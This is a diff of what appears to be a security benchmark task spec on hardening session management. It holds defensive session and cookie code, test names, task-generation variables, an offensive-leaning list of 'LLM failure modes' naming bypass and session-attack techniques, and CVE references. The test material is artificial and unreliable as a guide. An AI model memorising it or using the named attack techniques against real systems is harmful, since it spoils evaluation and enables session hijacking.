+              pass
+          
+          return False
+      
+      def _evict_oldest_session(self, user_id: str):
+          """Evict oldest session when limit reached."""
+          if user_id not in self._user_sessions:
+              return
+          
+          oldest_id = None
+          oldest_time = float('inf')
+          
+          for session_id in self._user_sessions[user_id]:
+              session = self._sessions.get(session_id)
+              if session and session.created_at < oldest_time:
+                  oldest_time = session.created_at
+                  oldest_id = session_id
+          
+          if oldest_id:
+              self.logout(oldest_id)
+              logging.info(f"Evicted oldest session: {oldest_id[:8]}...")
+      
+      def cleanup_expired(self) -> int:
+          """
+          Clean up expired sessions.
+          
+          Should be called periodically (cron job, scheduler).
+          
+          Returns:
+              Number of sessions cleaned up
+          """
+          now = time.time()
+          expired = []
+          
+          with self._lock:
+              for session_id, session in self._sessions.items():
+                  if (now - session.created_at > self.SESSION_TIMEOUT or
+                      now - session.last_accessed > self.IDLE_TIMEOUT):
+                      expired.append(session_id)
+              
+              for session_id in expired:
+                  self.logout(session_id)
+          
+          if expired:
+              logging.info(f"Cleaned up {len(expired)} expired sessions")
+          
+          return len(expired)
+  
+  
+  # ============================================================
+  # COOKIE CONFIGURATION
+  # ============================================================
+  
+  @dataclass
+  class SecureCookieConfig:
+      """Secure cookie configuration."""
+      name: str = "session"
+      secure: bool = True  # Only HTTPS
+      http_only: bool = True  # No JavaScript access
+      same_site: str = "Lax"  # CSRF protection
+      domain: Optional[str] = None
+      path: str = "/"
+      max_age: Optional[int] = None
+      
+      def to_cookie_string(self, value: str) -> str:
+          """Generate Set-Cookie header value."""
+          parts = [f"{self.name}={value}"]
+          
+          if self.secure:
+              parts.append("Secure")
+          if self.http_only:
+              parts.append("HttpOnly")
+          if self.same_site:
+              parts.append(f"SameSite={self.same_site}")
+          if self.domain:
+              parts.append(f"Domain={self.domain}")
+          if self.path:
+              parts.append(f"Path={self.path}")
+          if self.max_age:
+              parts.append(f"Max-Age={self.max_age}")
+          
+          return "; ".join(parts)
+
+# === TEST CASES ===
+fail_to_pass:
+  - "test_session_regeneration_on_login"
+  - "test_session_regeneration_on_privilege_change"
+  - "test_secure_session_id_generation"
+  - "test_complete_server_side_logout"
+  - "test_session_binding_enforcement"
+  - "test_concurrent_session_limit"
+  - "test_session_timeout_enforcement"
+  - "test_csrf_token_per_session"
+  - "test_cookie_security_attributes"
+  - "test_session_cleanup"
+
+pass_to_pass:
+  - "test_basic_session_creation"
+  - "test_session_data_storage"
+  - "test_valid_session_access"
+  - "test_authenticated_access"
+
+# === VARIABLES FOR TASK GENERATION ===
+variables:
+  scenario_type:
+    type: string
+    options:
+      - "e-commerce platform"
+      - "banking portal"
+      - "admin dashboard"
+      - "customer portal"
+      - "healthcare system"
+      - "enterprise application"
+      
+  path:
+    type: path
+    generator: random_path
+    
+  platform:
+    type: string
+    options:
+      - "Linux"
+      - "AWS"
+      - "Azure"
+      - "Kubernetes"
+      
+  language:
+    type: string
+    options:
+      - "Python"
+      - "Node.js"
+      - "Java"
+      - "PHP"
+      - "Ruby"
+      
+  framework:
+    type: string
+    options:
+      - "Django"
+      - "Flask"
+      - "Express"
+      - "Spring Boot"
+      - "Laravel"
+      
+  session_backend:
+    type: string
+    options:
+      - "In-memory"
+      - "Redis"
+      - "PostgreSQL"
+      - "Memcached"
+      - "MongoDB"
+      
+  session_count:
+    type: int
+    min: 100
+    max: 1000000
+    
+  session_lifetime_hours:
+    type: int
+    min: 1
+    max: 24
+    
+  attacker_position:
+    type: string
+    options:
+      - "Remote/Internet"
+      - "Same network"
+      - "Physical access"
+      
+  target_data:
+    type: string
+    options:
+      - "User accounts"
+      - "Financial data"
+      - "PII/PHI"
+      - "Admin access"
+      
+  compliance_req:
+    type: string
+    options:
+      - "PCI-DSS"
+      - "HIPAA"
+      - "SOC2"
+      - "GDPR"
+      - "None specific"
+      
+  task_steps:
+    type: template
+    value: |
+      1. Audit session management code
+      2. Identify session regeneration gaps
+      3. Verify session ID randomness
+      4. Check logout implementation (server-side)
+      5. Implement session binding
+      6. Add concurrent session controls
+      7. Configure cookie security attributes
+      8. Implement session timeouts
+      9. Add CSRF protection
+      10. Implement session monitoring
+      11. Test all attack vectors
+      12. Verify cleanup processes
+
+# === ANTI-PATTERNS AND LLM FAILURE MODES ===
+anti_patterns:
+  llm_failure_modes:
+    - "Applying textbook attack patterns without considering mitigations"
+    - "Missing WAF/IDS bypass techniques for exploitation"
+    - "Ignoring ASLR/PIE/NX and other modern protections"
+    - "Not considering timing side-channel in crypto implementations"
+    - "Missing second-order and stored attack vectors"
+    - "Overlooking race conditions in authentication flows"
+    - "Assuming standard libraries are secure without version checking"
+    - "Missing JWT algorithm confusion and key confusion attacks"
+    - "Ignoring deserialization gadget chain discovery complexity"
+    - "Not recognizing SameSite=Lax bypass via top-level navigation"
+    - "Missing __Host- and __Secure- cookie prefix bypass techniques"
+    - "Overlooking session regeneration race conditions in distributed systems"
+    - "Failing to identify subdomain cookie injection vectors"
+    - "Not considering session prediction via weak PRNG analysis"
+    - "Missing SSO logout propagation failures"
+    - "Ignoring session binding bypass via legitimate IP changes"
+    - "Not recognizing session storage backend-specific vulnerabilities"
+    - "Overlooking browser-specific cookie handling quirks"
+    - "Missing cross-tab session confusion attacks"
+    - "Failing to identify session extension via keep-alive abuse"
+    - "Not considering session token leakage via Referer headers"
+    - "Missing WebSocket session handling vulnerabilities"
+    - "Ignoring service worker session manipulation"
+    - "Not recognizing OAuth/OIDC session binding weaknesses"
+    - "Overlooking session clustering synchronization vulnerabilities"
+    - "Missing session cache poisoning in CDN/proxy setups"
+    - "Failing to identify session token entropy weaknesses"
+    - "Not considering session migration attacks in load-balanced environments"
+    - "Ignoring browser extension session interception vectors"
+
+# === ANTI-HARDCODING MEASURES ===
+anti_hardcoding:
+  canary_tokens: true
+  randomize_paths: true
+  dynamic_content: true
+  
+  session_attacks:
+    - "fixation_on_login"
+    - "predictable_ids"
+    - "incomplete_logout"
+    - "no_client_binding"
+    - "concurrent_session_abuse"
+    - "session_replay"
+    
+  verification_requirements:
+    - "Session ID regenerated on auth"
+    - "Server-side invalidation"
+    - "Binding enforced"
+    - "Cookie attributes set"
+
+# === CVE REFERENCES ===
+cve_references:
+  - id: "CVE-2012-5633"
+    description: "Apache CXF session fixation"
+    relevance: "Classic session fixation"
+    
+  - id: "CVE-2019-10247"
+    description: "Eclipse Jetty session fixation"
+    relevance: "Framework-level fixation"
